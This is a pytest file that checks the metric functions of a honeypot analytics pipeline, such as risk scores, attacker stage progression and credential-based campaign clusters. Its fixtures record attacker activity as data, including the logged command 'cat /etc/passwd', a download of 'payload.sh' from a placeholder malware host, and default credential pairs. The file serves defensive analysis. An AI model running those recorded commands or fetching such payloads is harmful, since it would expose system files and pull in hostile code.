"""Tests for gold-layer metric computation functions."""

from __future__ import annotations

from datetime import UTC, datetime

import polars as pl
import pytest

from lantana.models.ocsf import (
    CLASS_AUTHENTICATION,
    CLASS_DETECTION_FINDING,
    CLASS_FILE_ACTIVITY,
    CLASS_NETWORK_ACTIVITY,
    CLASS_PROCESS_ACTIVITY,
    STATUS_FAILURE,
    STATUS_SUCCESS,
    STATUS_UNKNOWN,
)
from lantana.transform.metrics import (
    compute_behavioral_progression,
    compute_campaign_clusters,
    compute_daily_summary,
    compute_detection_findings,
    compute_geographic_summary,
    compute_ip_reputation,
)

# ---------------------------------------------------------------------------
# Shared silver-like test fixture
# ---------------------------------------------------------------------------


def _ts(minute: int = 0, second: int = 0) -> datetime:
    """Helper: 2026-04-25T10:{minute}:{second} UTC."""
    return datetime(2026, 4, 25, 10, minute, second, tzinfo=UTC)


@pytest.fixture()
def silver_df() -> pl.DataFrame:
    """Build a realistic silver DataFrame with multiple IPs and event types.

    IP 203.0.113.50 ("attacker-1"): full escalation path
      - 2 nftables network events (scan)
      - 3 auth attempts (2 failures, 1 success)
      - 2 commands executed
      - 1 suricata alert

    IP 198.51.100.22 ("attacker-2"): credential stuffing only
      - 15 auth failures, 0 successes
      - uses same credentials as attacker-1 (root/admin) + others

    IP 192.0.2.99 ("attacker-3"): scanner only
      - 3 nftables network events, nothing else
    """
    rows: list[dict[str, object]] = []

    # --- attacker-1: nftables scan events ---
    for i in range(2):
        rows.append(
            {
                "class_uid": CLASS_NETWORK_ACTIVITY,
                "category_uid": 4,
                "severity_id": 3,
                "activity_id": 5,
                "type_uid": 400105,
                "time": _ts(minute=0, second=i),
                "message": "drop input",
                "status_id": STATUS_UNKNOWN,
                "src_endpoint_ip": "203.0.113.50",
                "src_endpoint_port": 54321 + i,
                "dst_endpoint_ip": "honeypot-sensor-01",
                "dst_endpoint_port": 23,
                "dataset": "nftables",
                "server": "sensor-01",
                "operation": "op_test",
                "session": None,
                "user_name": None,
                "unmapped_password": None,
                "actor_process_cmd_line": None,
                "finding_title": None,
                "finding_uid": None,
                "geo.country_code": "CN",
                "geo.asn": "64498",
                "geo.isp": "ChinaNet",
                "abuseipdb_confidence_score": 85,
                "abuseipdb_risk_score": 85.0,
                "greynoise_classification": "malicious",
                "greynoise_noise": True,
                "greynoise_riot": False,
                "greynoise_risk_score": 75.0,
            }
        )

    # --- attacker-1: auth attempts (2 fail, 1 success) ---
    for i, (user, pw, status) in enumerate(
        [
            ("root", "admin", STATUS_FAILURE),
            ("root", "password", STATUS_FAILURE),
            ("root", "admin", STATUS_SUCCESS),
        ]
    ):
        rows.append(
            {
                "class_uid": CLASS_AUTHENTICATION,
                "category_uid": 3,
                "severity_id": 3,
                "activity_id": 1,
                "type_uid": 300201,
                "time": _ts(minute=1, second=i),
                "message": "login attempt",
                "status_id": status,
                "src_endpoint_ip": "203.0.113.50",
                "src_endpoint_port": 54400 + i,
                "dst_endpoint_ip": "honeypot-sensor-01",
                "dst_endpoint_port": 2222,
                "dataset": "cowrie",
                "server": "sensor-01",
                "operation": "op_test",
                "session": "sess-a1",
                "user_name": user,
                "unmapped_password": pw,
                "actor_process_cmd_line": None,
                "finding_title": None,
                "finding_uid": None,
                "geo.country_code": "CN",
                "geo.asn": "64498",
                "geo.isp": "ChinaNet",
                "abuseipdb_confidence_score": 85,
                "abuseipdb_risk_score": 85.0,
                "greynoise_classification": "malicious",
                "greynoise_noise": True,
                "greynoise_riot": False,
                "greynoise_risk_score": 75.0,
            }
        )

    # --- attacker-1: commands executed ---
    for i, cmd in enumerate(["uname -a", "cat /etc/passwd"]):
        rows.append(
            {
                "class_uid": CLASS_PROCESS_ACTIVITY,
                "category_uid": 1,
                "severity_id": 3,
                "activity_id": 1,
                "type_uid": 100701,
                "time": _ts(minute=2, second=i),
                "message": f"CMD: {cmd}",
                "status_id": STATUS_UNKNOWN,
                "src_endpoint_ip": "203.0.113.50",
                "src_endpoint_port": 54500 + i,
                "dst_endpoint_ip": "honeypot-sensor-01",
                "dst_endpoint_port": 2222,
                "dataset": "cowrie",
                "server": "sensor-01",
                "operation": "op_test",
                "session": "sess-a1",
                "user_name": None,
                "unmapped_password": None,
                "actor_process_cmd_line": cmd,
                "finding_title": None,
                "finding_uid": None,
                "geo.country_code": "CN",
                "geo.asn": "64498",
                "geo.isp": "ChinaNet",
                "abuseipdb_confidence_score": 85,
                "abuseipdb_risk_score": 85.0,
                "greynoise_classification": "malicious",
                "greynoise_noise": True,
                "greynoise_riot": False,
                "greynoise_risk_score": 75.0,
            }
        )

    # --- attacker-1: file download (malware) ---
    rows.append(
        {
            "class_uid": CLASS_FILE_ACTIVITY,
            "category_uid": 1,
            "severity_id": 4,
            "activity_id": 2,
            "type_uid": 100102,
            "time": _ts(minute=2, second=30),
            "message": "Downloaded URL",
            "status_id": STATUS_UNKNOWN,
            "src_endpoint_ip": "203.0.113.50",
            "src_endpoint_port": 54321,
            "dst_endpoint_ip": "honeypot-sensor-01",
            "dst_endpoint_port": 2222,
            "dataset": "cowrie",
            "server": "sensor-01",
            "operation": "op_test",
            "session": "sess-a1",
            "user_name": None,
            "unmapped_password": None,
            "actor_process_cmd_line": None,
            "finding_title": None,
            "finding_uid": None,
            "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb924",
            "file_url": "http://malware.example.com/payload.sh",
            "file_path": "/tmp/payload.sh",
            "geo.country_code": "CN",
            "geo.asn": "64498",
            "geo.isp": "ChinaNet",
            "abuseipdb_confidence_score": 85,
            "abuseipdb_risk_score": 85.0,
            "greynoise_classification": "malicious",
            "greynoise_noise": True,
            "greynoise_riot": False,
            "greynoise_risk_score": 75.0,
        }
    )

    # --- attacker-1: suricata alert ---
    rows.append(
        {
            "class_uid": CLASS_DETECTION_FINDING,
            "category_uid": 2,
            "severity_id": 4,
            "activity_id": 1,
            "type_uid": 200401,
            "time": _ts(minute=0, second=30),
            "message": "ET SCAN Potential SSH Scan",
            "status_id": STATUS_UNKNOWN,
            "src_endpoint_ip": "203.0.113.50",
            "src_endpoint_port": 54321,
            "dst_endpoint_ip": "honeypot-sensor-01",
            "dst_endpoint_port": 22,
            "dataset": "suricata",
            "server": "sensor-01",
            "operation": "op_test",
            "session": None,
            "user_name": None,
            "unmapped_password": None,
            "actor_process_cmd_line": None,
            "finding_title": "ET SCAN Potential SSH Scan",
            "finding_uid": "2001219",
            "geo.country_code": "CN",
            "geo.asn": "64498",
            "geo.isp": "ChinaNet",
            "abuseipdb_confidence_score": 85,
            "abuseipdb_risk_score": 85.0,
            "greynoise_classification": "malicious",
            "greynoise_noise": True,
            "greynoise_riot": False,
            "greynoise_risk_score": 75.0,
        }
    )

    # --- attacker-2: credential stuffing (15 auth failures, shared creds) ---
    creds = [
        ("root", "admin"),
        ("root", "password"),
        ("root", "123456"),
        ("admin", "admin"),
        ("admin", "password"),
        ("test", "test"),
        ("root", "root"),
        ("user", "user"),
        ("root", "toor"),
        ("admin", "123456"),
        ("root", "admin"),
        ("root", "password"),
        ("admin", "admin"),
        ("root", "admin"),
        ("root", "letmein"),
    ]
    for i, (user, pw) in enumerate(creds):
        rows.append(
            {
                "class_uid": CLASS_AUTHENTICATION,
                "category_uid": 3,
                "severity_id": 2,
                "activity_id": 1,
                "type_uid": 300201,
                "time": _ts(minute=5, second=i * 2),
                "message": "login attempt",
                "status_id": STATUS_FAILURE,
                "src_endpoint_ip": "198.51.100.22",
                "src_endpoint_port": 12300 + i,
                "dst_endpoint_ip": "honeypot-sensor-01",
                "dst_endpoint_port": 2222,
                "dataset": "cowrie",
                "server": "sensor-01",
                "operation": "op_test",
                "session": f"sess-b{i}",
                "user_name": user,
                "unmapped_password": pw,
                "actor_process_cmd_line": None,
                "finding_title": None,
                "finding_uid": None,
                "geo.country_code": "RU",
                "geo.asn": "64499",
                "geo.isp": "Rostelecom",
                "abuseipdb_confidence_score": 42,
                "abuseipdb_risk_score": 42.0,
                "greynoise_classification": "benign",
                "greynoise_noise": False,
                "greynoise_riot": False,
                "greynoise_risk_score": 0.0,
            }
        )

    # --- attacker-3: scanner only (nftables) ---
    for i in range(3):
        rows.append(
            {
                "class_uid": CLASS_NETWORK_ACTIVITY,
                "category_uid": 4,
                "severity_id": 1,
                "activity_id": 5,
                "type_uid": 400105,
                "time": _ts(minute=8, second=i * 10),
                "message": "drop input",
                "status_id": STATUS_UNKNOWN,
                "src_endpoint_ip": "192.0.2.99",
                "src_endpoint_port": 60000 + i,
                "dst_endpoint_ip": "honeypot-sensor-01",
                "dst_endpoint_port": 80 + i,
                "dataset": "nftables",
                "server": "sensor-01",
                "operation": "op_test",
                "session": None,
                "user_name": None,
                "unmapped_password": None,
                "actor_process_cmd_line": None,
                "finding_title": None,
                "finding_uid": None,
                "geo.country_code": "US",
                "geo.asn": "64500",
                "geo.isp": "Google",
                "abuseipdb_confidence_score": 10,
                "abuseipdb_risk_score": 10.0,
                "greynoise_classification": "benign",
                "greynoise_noise": False,
                "greynoise_riot": False,
                "greynoise_risk_score": 0.0,
            }
        )

    return pl.DataFrame(rows)


# ---------------------------------------------------------------------------
# daily_summary
# ---------------------------------------------------------------------------


class TestDailySummary:
    def test_scalar_counts(self, silver_df: pl.DataFrame) -> None:
        """Total events, unique IPs, class-specific counts are correct."""
        result = compute_daily_summary(silver_df)
        assert result.height == 1
        row = result.row(0, named=True)
        # 2 nft(a1) + 3 auth(a1) + 2 cmd(a1) + 1 download(a1) + 1 alert(a1)
        # + 15 auth(a2) + 3 nft(a3) = 27
        assert row["total_events"] == 27
        assert row["unique_source_ips"] == 3
        assert row["auth_attempts"] == 18  # 3 (a1) + 15 (a2)
        assert row["auth_successes"] == 1
        assert row["auth_failures"] == 17
        assert row["commands_executed"] == 2
        assert row["findings_detected"] == 1
        assert row["network_events"] == 5  # 2 (a1) + 3 (a3)

    def test_top_n_lists(self, silver_df: pl.DataFrame) -> None:
        """Top-N lists populated from silver data, each entry shaped {value, count}."""
        result = compute_daily_summary(silver_df)
        row = result.row(0, named=True)
        usernames = [e["value"] for e in row["top_usernames"]]
        passwords = [e["value"] for e in row["top_passwords"]]
        commands = [e["value"] for e in row["top_commands"]]
        countries = [e["value"] for e in row["top_source_countries"]]
        assert "root" in usernames
        assert "admin" in passwords
        assert "uname -a" in commands
        assert "CN" in countries
        # Counts must be positive integers, not strings.
        assert all(isinstance(e["count"], int) and e["count"] > 0 for e in row["top_usernames"])

    def test_top_credential_pairs(self, silver_df: pl.DataFrame) -> None:
        """Credential pairs surface as `[{username, password, count}, ...]`.

        The silver fixture has attacker-1 try (root, admin) twice and
        (root, password) once; attacker-2 hammers many pairs but reuses
        (root, admin) too. (root, admin) should rank first.
        """
        result = compute_daily_summary(silver_df)
        pairs = result.row(0, named=True)["top_credential_pairs"]
        assert isinstance(pairs, list)
        assert len(pairs) > 0
        first = pairs[0]
        assert set(first.keys()) == {"username", "password", "count"}
        assert first["username"] == "root"
        assert first["password"] == "admin"
        assert first["count"] >= 2  # two distinct events with this pair

    def test_top_countries_ranked_by_unique_ips(self) -> None:
        """Country ranking matches `geographic_summary` (unique-IP based).

        Regression test for the Overview/Geography divergence: previously the
        Overview page ranked countries by event count, so a single chatty IP
        from CH would outrank a swarm of distinct US scanners. Both pages must
        now use the same unique-IP ranking.
        """
        rows: list[dict[str, object]] = []
        # CH: 1 IP, 100 events — would win event-count ranking
        for i in range(100):
            rows.append(
                {
                    "class_uid": CLASS_AUTHENTICATION,
                    "status_id": STATUS_FAILURE,
                    "src_endpoint_ip": "192.0.2.1",
                    "geo.country_code": "CH",
                    "user_name": "root",
                    "unmapped_password": "x",
                    "actor_process_cmd_line": None,
                    "session": f"s-{i}",
                    "finding_title": None,
                    "finding_uid": None,
                    "file_hash_sha256": None,
                    "file_url": None,
                }
            )
        # US: 5 distinct IPs, 1 event each — wins unique-IP ranking
        for i in range(5):
            rows.append(
                {
                    "class_uid": CLASS_AUTHENTICATION,
                    "status_id": STATUS_FAILURE,
                    "src_endpoint_ip": f"198.51.100.{i + 1}",
                    "geo.country_code": "US",
                    "user_name": "admin",
                    "unmapped_password": "y",
                    "actor_process_cmd_line": None,
                    "session": f"u-{i}",
                    "finding_title": None,
                    "finding_uid": None,
                    "file_hash_sha256": None,
                    "file_url": None,
                }
            )
        silver = pl.DataFrame(rows)
        result = compute_daily_summary(silver)
        countries = result.row(0, named=True)["top_source_countries"]
        assert countries[0]["value"] == "US", f"expected US first (5 unique IPs), got {countries}"
        assert countries[0]["count"] == 5  # 5 unique US IPs
        # CH has 1 unique IP regardless of its 100 events
        ch_entry = next(e for e in countries if e["value"] == "CH")
        assert ch_entry["count"] == 1

    def test_empty_dataframe(self) -> None:
        """Empty silver returns empty summary."""
        result = compute_daily_summary(pl.DataFrame())
        assert result.is_empty()

    def test_suricata_only_silver_does_not_crash(self) -> None:
        """When cowrie silver is missing (defect #9 transitively crashed it),
        ``read_silver_partition`` returns a diagonal-concat lacking
        cowrie-only columns like ``session``. Defect #10: the transform must
        not ColumnNotFoundError — gold should still be produced from
        whatever silver landed cleanly.
        """
        suricata_only = pl.DataFrame(
            {
                "class_uid": [2004, 4001, 4001],
                "status_id": [0, 0, 0],
                "src_endpoint_ip": ["203.0.113.10", "203.0.113.20", "198.51.100.50"],
                "dataset": ["suricata"] * 3,
            }
        )
        result = compute_daily_summary(suricata_only)
        assert result.height == 1
        row = result.row(0, named=True)
        assert row["total_events"] == 3
        assert row["unique_sessions"] == 0  # cowrie missing → no sessions
        assert row["findings_detected"] == 1
        assert row["network_events"] == 2


# ---------------------------------------------------------------------------
# ip_reputation
# ---------------------------------------------------------------------------


class TestIPReputation:
    def test_one_row_per_ip(self, silver_df: pl.DataFrame) -> None:
        """Output has one row per unique source IP."""
        result = compute_ip_reputation(silver_df)
        assert result.height == 3
        ips = set(result.get_column("src_endpoint_ip").to_list())
        assert ips == {"203.0.113.50", "198.51.100.22", "192.0.2.99"}

    def test_attacker1_reputation(self, silver_df: pl.DataFrame) -> None:
        """Attacker-1 (full escalation) scores monotonically under v1.5 formula.

        Score decomposes as:
          enrichment_risk_score = mean(abuseipdb=85, greynoise=75) = 80.0
          behavioral_risk_score = +25 (auth success) +25 (commands) +15 (findings)
                                  +25 (downloads) + min(3,100)*0.1 = 90.3
          risk_score = max(90.3, (90.3 + 80.0)/2) = 90.3 (monotonic!)
        """
        result = compute_ip_reputation(silver_df)
        a1 = result.filter(pl.col("src_endpoint_ip") == "203.0.113.50")
        row = a1.row(0, named=True)
        assert row["total_events"] == 9
        assert row["auth_attempts"] == 3
        assert row["auth_successes"] == 1
        assert row["commands_executed"] == 2
        assert row["findings_triggered"] == 1
        assert row["downloads"] == 1
        assert row["enrichment_risk_score"] == pytest.approx(80.0)
        assert row["behavioral_risk_score"] == pytest.approx(90.3)
        assert row["risk_score"] == pytest.approx(90.3)

    def test_scanner_low_risk(self, silver_df: pl.DataFrame) -> None:
        """Benign scanner-only IP gets risk_score=0.0 under v1.5 RIOT/benign guard."""
        result = compute_ip_reputation(silver_df)
        a3 = result.filter(pl.col("src_endpoint_ip") == "192.0.2.99")
        row = a3.row(0, named=True)
        assert row["auth_attempts"] == 0
        assert row["commands_executed"] == 0
        assert row["enrichment_risk_score"] == pytest.approx(5.0)
        assert row["behavioral_risk_score"] == pytest.approx(0.0)
        assert row["risk_score"] == pytest.approx(0.0)

    def test_enrichment_columns_present(self, silver_df: pl.DataFrame) -> None:
        """GeoIP, raw enrichment, per-provider risk_scores, and the gold
        sub-scores all materialise in the output schema."""
        result = compute_ip_reputation(silver_df)
        assert "geo_country" in result.columns
        assert "abuseipdb_score" in result.columns
        assert "greynoise_class" in result.columns
        # Phase D.2 additions:
        assert "greynoise_riot" in result.columns
        assert "greynoise_noise" in result.columns
        for col in (
            "abuseipdb_risk_score",
            "virustotal_risk_score",
            "shodan_risk_score",
            "greynoise_risk_score",
            "enrichment_risk_score",
            "behavioral_risk_score",
        ):
            assert col in result.columns

    def test_datasets_tracked(self, silver_df: pl.DataFrame) -> None:
        """Datasets list shows which datasets the IP appeared in."""
        result = compute_ip_reputation(silver_df)
        a1 = result.filter(pl.col("src_endpoint_ip") == "203.0.113.50")
        datasets = set(a1.get_column("datasets").to_list()[0])
        assert datasets == {"cowrie", "nftables", "suricata"}

    def test_partial_enrichment_day(self) -> None:
        """When a provider was rate-limited / circuit-broken for the whole day,
        its silver columns are simply absent. compute_ip_reputation must not
        crash — the aggregation columns get null values, the risk formula uses
        fill_null(0) to absorb them.
        """
        partial = pl.DataFrame(
            {
                "src_endpoint_ip": ["203.0.113.50"],
                "dataset": ["suricata"],
                "class_uid": [CLASS_NETWORK_ACTIVITY],
                "status_id": [STATUS_UNKNOWN],
                "user_name": [None],
                "unmapped_password": [None],
                "time": [datetime(2026, 5, 19, 12, 0, tzinfo=UTC)],
                "geo.country_code": ["BR"],
                "geo.asn": [64501],
                "geo.isp": ["Example ISP"],
                # No abuseipdb_*, greynoise_*, shodan_*, vt_* columns at all
            }
        )
        result = compute_ip_reputation(partial)
        assert result.height == 1
        row = result.row(0, named=True)
        # Optional columns return null when absent — required to be tolerated.
        assert row["abuseipdb_score"] is None
        assert row["greynoise_class"] is None
        # Per-provider risk_scores also null on an enrichment-less day.
        assert row["abuseipdb_risk_score"] is None
        assert row["virustotal_risk_score"] is None
        assert row["shodan_risk_score"] is None
        assert row["greynoise_risk_score"] is None
        # enrichment_risk_score: mean of all-nulls is null. behavioral_risk_score
        # is 0 (no auth, no commands, etc.). Composite: (0 + 0) / 2 = 0.
        assert row["enrichment_risk_score"] is None
        assert row["behavioral_risk_score"] == pytest.approx(0.0)
        assert row["risk_score"] == pytest.approx(0.0)


# ---------------------------------------------------------------------------
# behavioral_progression
# ---------------------------------------------------------------------------


class TestBehavioralProgression:
    def test_attacker1_interactive_stage(self, silver_df: pl.DataFrame) -> None:
        """Attacker-1 reaches stage 4 (interactive)."""
        result = compute_behavioral_progression(silver_df)
        a1 = result.filter(pl.col("src_endpoint_ip") == "203.0.113.50")
        row = a1.row(0, named=True)
        assert row["max_stage"] == 4
        assert row["stage_label"] == "interactive"
        assert row["commands_executed"] == 2
        assert row["auth_successes"] == 1

    def test_attacker2_credential_stage(self, silver_df: pl.DataFrame) -> None:
        """Attacker-2 (no success) reaches stage 2 (credential)."""
        result = compute_behavioral_progression(silver_df)
        a2 = result.filter(pl.col("src_endpoint_ip") == "198.51.100.22")
        row = a2.row(0, named=True)
        assert row["max_stage"] == 2
        assert row["stage_label"] == "credential"
        assert row["auth_successes"] == 0

    def test_scanner_stage(self, silver_df: pl.DataFrame) -> None:
        """Scanner-only IP at stage 1 (scan)."""
        result = compute_behavioral_progression(silver_df)
        a3 = result.filter(pl.col("src_endpoint_ip") == "192.0.2.99")
        row = a3.row(0, named=True)
        assert row["max_stage"] == 1
        assert row["stage_label"] == "scan"
        assert row["scan_events"] == 3

    def test_time_to_escalation(self, silver_df: pl.DataFrame) -> None:
        """Attacker-1 has escalation timing computed."""
        result = compute_behavioral_progression(silver_df)
        a1 = result.filter(pl.col("src_endpoint_ip") == "203.0.113.50")
        row = a1.row(0, named=True)
        # first_seen at 10:00:00, first auth at 10:01:00 -> 60 seconds
        assert row["seconds_to_auth"] == 60
        # first auth at 10:01:00, first success at 10:01:02 -> 2 seconds
        assert row["seconds_to_success"] == 2
        # first success at 10:01:02, first command at 10:02:00 -> 58 seconds
        assert row["seconds_to_command"] == 58

    def test_automated_detection(self, silver_df: pl.DataFrame) -> None:
        """Attacker-2 (rapid credential stuffing) flagged as automated."""
        result = compute_behavioral_progression(silver_df)
        a2 = result.filter(pl.col("src_endpoint_ip") == "198.51.100.22")
        row = a2.row(0, named=True)
        assert row["is_automated"] is True

    def test_one_row_per_ip(self, silver_df: pl.DataFrame) -> None:
        """Output has one row per unique source IP."""
        result = compute_behavioral_progression(silver_df)
        assert result.height == 3


# ---------------------------------------------------------------------------
# campaign_clusters
# ---------------------------------------------------------------------------


class TestCampaignClusters:
    def test_shared_credential_cluster(self, silver_df: pl.DataFrame) -> None:
        """IPs sharing (root, admin) are clustered together."""
        result = compute_campaign_clusters(silver_df)
        # root/admin is used by both attacker-1 and attacker-2
        root_admin = result.filter(
            (pl.col("shared_username") == "root") & (pl.col("shared_password") == "admin")
        )
        assert root_admin.height == 1
        row = root_admin.row(0, named=True)
        assert row["ip_count"] == 2
        assert set(row["ips"]) == {"203.0.113.50", "198.51.100.22"}

    def test_single_ip_creds_excluded(self, silver_df: pl.DataFrame) -> None:
        """Credential pairs used by only 1 IP are not clusters."""
        result = compute_campaign_clusters(silver_df)
        # "test"/"test" only used by attacker-2
        test_test = result.filter(
            (pl.col("shared_username") == "test") & (pl.col("shared_password") == "test")
        )
        assert test_test.height == 0

    def test_cluster_has_timing(self, silver_df: pl.DataFrame) -> None:
        """Clusters have first_seen and last_seen timestamps."""
        result = compute_campaign_clusters(silver_df)
        assert "first_seen" in result.columns
        assert "last_seen" in result.columns

    def test_empty_dataframe(self) -> None:
        """Empty silver returns empty clusters."""
        result = compute_campaign_clusters(pl.DataFrame())
        assert result.is_empty()


# ---------------------------------------------------------------------------
# Multi-day behavioral progression
# ---------------------------------------------------------------------------


def _make_silver_row(
    ip: str,
    class_uid: int,
    ts: datetime,
    *,
    status_id: int = STATUS_UNKNOWN,
    user_name: str | None = None,
    unmapped_password: str | None = None,
    actor_process_cmd_line: str | None = None,
) -> dict[str, object]:
    """Build a single silver-like row for multi-day tests."""
    return {
        "class_uid": class_uid,
        "category_uid": 4 if class_uid == CLASS_NETWORK_ACTIVITY else 3,
        "severity_id": 2,
        "activity_id": 1,
        "type_uid": class_uid * 100 + 1,
        "time": ts,
        "message": "test event",
        "status_id": status_id,
        "src_endpoint_ip": ip,
        "src_endpoint_port": 54321,
        "dst_endpoint_ip": "honeypot-sensor-01",
        "dst_endpoint_port": 2222,
        "dataset": "cowrie",
        "server": "sensor-01",
        "operation": "op_test",
        "session": None,
        "user_name": user_name,
        "unmapped_password": unmapped_password,
        "actor_process_cmd_line": actor_process_cmd_line,
        "finding_title": None,
        "finding_uid": None,
        "geo.country_code": "CN",
        "geo.asn": "64498",
        "geo.isp": "ChinaNet",
        "abuseipdb_confidence_score": 50,
        "greynoise_classification": "malicious",
        "greynoise_noise": False,
    }


# ---------------------------------------------------------------------------
# geographic_summary
# ---------------------------------------------------------------------------


class TestGeographicSummary:
    def test_top_countries(self, silver_df: pl.DataFrame) -> None:
        """top_countries contains country:count entries."""
        result = compute_geographic_summary(silver_df)
        assert not result.is_empty()
        countries = result.row(0, named=True)["top_countries"]
        assert isinstance(countries, list)
        assert len(countries) > 0
        # Each entry should be "CC:N" format
        assert ":" in countries[0]

    def test_empty_data(self) -> None:
        """Empty DataFrame returns empty result."""
        assert compute_geographic_summary(pl.DataFrame()).is_empty()

    def test_missing_geo_columns(self) -> None:
        """DataFrame without geo columns returns empty."""
        df = pl.DataFrame({"src_endpoint_ip": ["192.0.2.1"]})
        assert compute_geographic_summary(df).is_empty()

    def test_int64_asn_column(self) -> None:
        """Production geo.asn is Int64 (MaxMind ASN MMDB returns int).

        Previously the function did `pl.col("geo.asn") != ""` which only
        worked with string-typed test fixtures and crashed in production
        with ComputeError: cannot compare string with numeric type (i64).
        """
        df = pl.DataFrame(
            {
                "src_endpoint_ip": ["203.0.113.50", "198.51.100.22"],
                "geo.country_code": ["BR", "US"],
                "geo.city": ["São Paulo", "New York"],
                "geo.latitude": [-23.5, 40.7],
                "geo.longitude": [-46.6, -74.0],
                "geo.asn": pl.Series([65536, 64500], dtype=pl.Int64),
                "geo.isp": ["CONECTA LTDA.", "Google"],
            }
        )
        result = compute_geographic_summary(df)
        assert not result.is_empty()
        asns = result.row(0, named=True)["top_asns"]
        assert isinstance(asns, list)
        assert len(asns) == 2
        # ASN values are stringified in the output entries
        joined = " ".join(asns)
        assert "65536" in joined
        assert "64500" in joined


# ---------------------------------------------------------------------------
# detection_findings
# ---------------------------------------------------------------------------


class TestDetectionFindings:
    def test_groups_by_rule(self, silver_df: pl.DataFrame) -> None:
        """Returns one row per unique finding_title."""
        result = compute_detection_findings(silver_df)
        if result.is_empty():
            pytest.skip("No findings in test fixture")
        assert "finding_title" in result.columns
        assert "event_count" in result.columns
        assert "unique_ips" in result.columns

    def test_empty_data(self) -> None:
        """Empty DataFrame returns empty result."""
        assert compute_detection_findings(pl.DataFrame()).is_empty()

    def test_no_findings(self) -> None:
        """DataFrame with no detection findings returns empty."""
        df = pl.DataFrame(
            {
                "class_uid": [CLASS_NETWORK_ACTIVITY],
                "finding_title": [None],
                "src_endpoint_ip": ["192.0.2.1"],
                "severity_id": [3],
                "time": [_ts()],
            }
        )
        assert compute_detection_findings(df).is_empty()


# ---------------------------------------------------------------------------
# enhanced risk scoring
# ---------------------------------------------------------------------------


class TestEnhancedRiskScoring:
    """Behaviour previously pinned to the old `+10 if vt_malicious_count >= 3`
    / `+10 if shodan_vulns present` rules — re-cast as per-provider risk_score
    contributions under the Phase D.2 composite. Direction of effect is the
    same: a hot VT signal or Shodan-CVE marker raises the composite."""

    def test_vt_risk_score_boosts_composite(self) -> None:
        """A populated virustotal_risk_score lifts the composite."""
        base = {
            "class_uid": CLASS_NETWORK_ACTIVITY,
            "category_uid": 4,
            "severity_id": 3,
            "activity_id": 5,
            "type_uid": 400105,
            "time": _ts(),
            "message": "test",
            "status_id": STATUS_UNKNOWN,
            "src_endpoint_ip": "192.0.2.1",
            "src_endpoint_port": 12345,
            "dst_endpoint_ip": "honeypot-01",
            "dst_endpoint_port": 22,
            "dataset": "nftables",
            "server": "test",
            "operation": "test",
            "session": None,
            "user_name": None,
            "unmapped_password": None,
            "actor_process_cmd_line": None,
            "finding_title": None,
            "finding_uid": None,
            "geo.country_code": "US",
            "geo.asn": "1234",
            "geo.isp": "TestISP",
            # No abuseipdb/greynoise/shodan/vt risk_score columns in the
            # baseline — leave the per-provider mean fully null so only the
            # one provider added per test contributes.
            "abuseipdb_confidence_score": 0,
            "greynoise_classification": None,
            "greynoise_noise": False,
            "greynoise_riot": False,
        }
        df_no_vt = pl.DataFrame([base])
        r1 = compute_ip_reputation(df_no_vt)
        score_no_vt = r1.row(0, named=True)["risk_score"]

        # vt_malicious_count=5 → virustotal_risk_score=50 (bucket 3-5).
        row_vt = {
            **base,
            "vt_malicious_count": 5,
            "virustotal_risk_score": 50.0,
        }
        df_vt = pl.DataFrame([row_vt])
        r2 = compute_ip_reputation(df_vt)
        row_with_vt = r2.row(0, named=True)
        score_vt = row_with_vt["risk_score"]

        # Pure scanner: enrichment=50 * 0.35 = 17.5 (capped <= 35, never enters STIX)
        assert score_vt == pytest.approx(17.5)
        assert score_vt > score_no_vt
        assert row_with_vt["virustotal_risk_score"] == 50.0

    def test_shodan_vulns_lifts_composite_via_score(self) -> None:
        """Non-empty shodan_vulns → shodan_risk_score=100 lifts the composite."""
        base = {
            "class_uid": CLASS_NETWORK_ACTIVITY,
            "category_uid": 4,
            "severity_id": 3,
            "activity_id": 5,
            "type_uid": 400105,
            "time": _ts(),
            "message": "test",
            "status_id": STATUS_UNKNOWN,
            "src_endpoint_ip": "192.0.2.1",
            "src_endpoint_port": 12345,
            "dst_endpoint_ip": "honeypot-01",
            "dst_endpoint_port": 22,
            "dataset": "nftables",
            "server": "test",
            "operation": "test",
            "session": None,
            "user_name": None,
            "unmapped_password": None,
            "actor_process_cmd_line": None,
            "finding_title": None,
            "finding_uid": None,
            "geo.country_code": "US",
            "geo.asn": "1234",
            "geo.isp": "TestISP",
            # No abuseipdb/greynoise/shodan/vt risk_score columns in the
            # baseline — leave the per-provider mean fully null so only the
            # one provider added per test contributes.
            "abuseipdb_confidence_score": 0,
            "greynoise_classification": None,
            "greynoise_noise": False,
            "greynoise_riot": False,
        }
        df_no_vuln = pl.DataFrame([base])
        r1 = compute_ip_reputation(df_no_vuln)
        score_no_vuln = r1.row(0, named=True)["risk_score"]

        row_vuln = {
            **base,
            "shodan_vulns": "CVE-2021-1234,CVE-2022-5678",
            "shodan_risk_score": 100.0,
        }
        df_vuln = pl.DataFrame([row_vuln])
        r2 = compute_ip_reputation(df_vuln)
        row_with_vuln = r2.row(0, named=True)
        score_vuln = row_with_vuln["risk_score"]

        # With Shodan=100 alone (the CVE marker), enrichment_risk_score=100,
        # behavioral=0, composite=50. Base composite=0. Net: ≥ +30 lift.
        assert score_vuln >= score_no_vuln + 30
        assert row_with_vuln["shodan_risk_score"] == 100.0

    def test_optional_columns_present_when_available(self) -> None:
        """When enrichment columns exist, they appear in the output."""
        base = {
            "class_uid": CLASS_NETWORK_ACTIVITY,
            "category_uid": 4,
            "severity_id": 3,
            "activity_id": 5,
            "type_uid": 400105,
            "time": _ts(),
            "message": "test",
            "status_id": STATUS_UNKNOWN,
            "src_endpoint_ip": "192.0.2.1",
            "src_endpoint_port": 12345,
            "dst_endpoint_ip": "honeypot-01",
            "dst_endpoint_port": 22,
            "dataset": "nftables",
            "server": "test",
            "operation": "test",
            "session": None,
            "user_name": None,
            "unmapped_password": None,
            "actor_process_cmd_line": None,
            "finding_title": None,
            "finding_uid": None,
            "geo.country_code": "US",
            "geo.asn": "1234",
            "geo.isp": "TestISP",
            "geo.city": "New York",
            "geo.latitude": 40.7128,
            "geo.longitude": -74.006,
            "abuseipdb_confidence_score": 50,
            "abuseipdb_total_reports": 25,
            "greynoise_classification": "malicious",
            "greynoise_name": "Mirai",
            "greynoise_noise": True,
            "shodan_ports": "22,80,443",
            "shodan_os": "Linux",
            "shodan_vulns": "CVE-2021-1234",
            "shodan_org": "Example Hosting ISP",
            "vt_malicious_count": 5,
            "vt_ip_reputation": -10,
        }
        df = pl.DataFrame([base])
        result = compute_ip_reputation(df)
        row = result.row(0, named=True)

